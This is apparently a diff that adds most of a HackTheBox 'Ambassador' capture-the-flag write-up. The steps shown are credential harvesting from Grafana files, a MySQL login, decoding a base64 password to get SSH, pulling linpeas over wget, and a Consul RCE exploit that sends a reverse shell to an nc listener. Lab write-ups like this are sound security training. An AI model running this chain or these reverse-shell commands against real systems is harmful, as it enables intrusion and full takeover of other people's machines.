@@ -244,3 +244,293 @@ After Executing Our Python Script Using python exploit.py command Several types 
 ```
 
 After a successful attempt of exploit, I was given a `secret key`, and there were also a couple of file in my directory too.
+
+Looking inside the files that were dumped by the exploit, I found a `grafana.ini` file I found the credentials for `admin` user.
+
+![amb-5](https://user-images.githubusercontent.com/87711310/218239670-f6f3b971-4dcf-4c6f-ac53-40ed1ea4c13e.png)
+
+Then, I looked at `grafana.db` to look if there's any other useful information. I used a tool called `DB browser for SQLite` and can be download by using the following command.
+
+```
+sudo apt-get install sqlitebrowser
+```
+
+And using the following command, you can use the tool
+
+```
+sqlitebrowser grafana.db
+```
+
+fter Loading `grafana.db` into the DB browser there is a table called `data_source` where we can find the credentials for the MySQL database login.
+
+![amb-6](https://user-images.githubusercontent.com/87711310/218240092-3269d477-5683-4d48-af66-ce62de3b6c54.png)
+
+The credentials were:
+```
+grafana:dontStandSoCloseToMe63221!
+```
+
+Now that there was a MySQL database that is hosted on port `3306`, I decided to log into the database.
+
+```
+mysql -u grafana -p'dontStandSoCloseToMe63221!' -h 10.10.11.183 -P 3306
+```
+
+After logging into the database, I enumerated the database to find something juicy. There was an interesting database called `whackywidget` and inside that , there was a table called `users` which contained a `Base64` encoded password for the user `Developer` which was hinted at the start of the challenge on the web-page at port `80`.
+
+```
+┌──(darshan㉿kali)-[~/…/Linux-Boxes/Ambassador/exploit-grafana-CVE-2021-43798/http_10_10_11_183_3000]
+└─$ mysql -u grafana -p'dontStandSoCloseToMe63221!' -h 10.10.11.183 -P 3306
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 46
+Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| grafana            |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| whackywidget       |
++--------------------+
+6 rows in set (0.206 sec)
+
+MySQL [(none)]> use whackywidget;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [whackywidget]> show tables;
++------------------------+
+| Tables_in_whackywidget |
++------------------------+
+| users                  |
++------------------------+
+1 row in set (0.197 sec)
+
+MySQL [whackywidget]> select * from users;
++-----------+------------------------------------------+
+| user      | pass                                     |
++-----------+------------------------------------------+
+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
++-----------+------------------------------------------+
+1 row in set (0.196 sec)
+```
+
+I decoded the password.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Ambassador]
+└─$ echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
+anEnglishManInNewYork027468
+```
+
+So, now, I tried to ssh into the machine using `developer's` credentials.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Ambassador]
+└─$ ssh developer@10.10.11.183                       
+The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.
+ED25519 key fingerprint is SHA256:zXkkXkOCX9Wg6pcH1yaG4zCZd5J25Co9TrlNWyChdZk.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.183' (ED25519) to the list of known hosts.
+developer@10.10.11.183's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat 11 Feb 2023 04:43:46 AM UTC
+
+  System load:           0.14
+  Usage of /:            81.0% of 5.07GB
+  Memory usage:          40%
+  Swap usage:            0%
+  Processes:             228
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.183
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:55dc
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri Sep  2 02:33:30 2022 from 10.10.0.1
+developer@ambassador:~$ whoami
+developer
+```
+
+Grabbing the user flag.
+
+```
+developer@ambassador:~$ pwd
+/home/developer
+developer@ambassador:~$ ls
+snap  user.txt
+developer@ambassador:~$ cat user.txt
+[REDACTED]
+```
+
+## Privilege Escalation
+My first step in PrivEsc is to run `linpeas`. So I hosted a python server on my machine wheere the linpeas file lies and used `wget` to transfer it to the victim machine.
+
+But I didnt find anything from `linpeas`
+
+So, next, I started manual enumeration.
+
+`sudo -l` didnt give me anything either.
+
+```
+developer@ambassador:/tmp$ sudo -l
+[sudo] password for developer: 
+Sorry, user developer may not run sudo on ambassador.
+```
+
+Next, I looked at the `crontabs`. nothing there too.
+
+```
+developer@ambassador:/tmp$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+```
+
+
+Then, I looked  inside the `/opt` directory. I found a directory named `my-app` there. Inside the `my-app` directory, There is a directory called `.git`. Then I dig into the git log using the below commands. 
+
+```
+developer@ambassador:/tmp$ cd /opt
+developer@ambassador:/opt$ ls
+consul  my-app
+developer@ambassador:/opt$ cd my-app/
+developer@ambassador:/opt/my-app$ ls
+env  whackywidget
+developer@ambassador:/opt/my-app$ ls -la
+total 24
+drwxrwxr-x 5 root root 4096 Mar 13  2022 .
+drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
+drwxrwxr-x 4 root root 4096 Mar 13  2022 env
+drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
+-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
+drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
+developer@ambassador:/opt/my-app$ git log
+commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:47:36 2022 +0000
+
+    tidy config script
+
+commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:44:45 2022 +0000
+
+    config script
+
+commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 22:47:01 2022 +0000
+
+    created project with django CLI
+
+commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 22:44:11 2022 +0000
+
+    .gitignore
+```
+
+After running the git log command, I saw there are various git commits and I decided to inspect the changes of the last commit (33a53ef9a207976d5ceceddc41a199558843bf3c) using the below command:
+
+```
+developer@ambassador:/opt/my-app$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
+commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:47:36 2022 +0000
+
+    tidy config script
+
+diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
+index 35c08f6..fc51ec0 100755
+--- a/whackywidget/put-config-in-consul.sh
++++ b/whackywidget/put-config-in-consul.sh
+@@ -1,4 +1,4 @@
+ # We use Consul for application config in production, this script will help set the correct values for the app
+-# Export MYSQL_PASSWORD before running
++# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
+ 
+-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
++consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
+```
+
+Now, I saw that there was a service called `Consul` being used and it was configured with some security token (bb03b43b-1d81-d62b-24b5-39540ee469b5).
+
+I looked up for an exploit `Consul` and found this [Github exploit](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API).
+
+To get the root shell first you need to start Netcat listener, so I started my netcat listener.
+
+```
+nc -lvnp 4444
+```
+
+After that, I started a python server to transfer my python exploit to the victim machine using the command `python3 -m http.server 8000`. I Download the python script using `wget http://your_ip:8000/consul-exploit.py`.
+
+Once I ran the exploit, I got a message to check my listener.
+
+```
+developer@ambassador:/tmp$ python3 consul-exploit.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.94 --lport 4444 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
+
+[+] Request sent successfully, check your listener
+```
+
+After this message, I checked my listener and I had a root shell.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Ambassador]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.94] from (UNKNOWN) [10.10.11.183] 60826
+bash: cannot set terminal process group (28061): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ambassador:/# whoami
+whoami
+root
+```
+
+Grabbing the `root` flag.
+
+```
+root@ambassador:/# cat /root/root.txt
+cat /root/root.txt
+[REDACTED]
+```
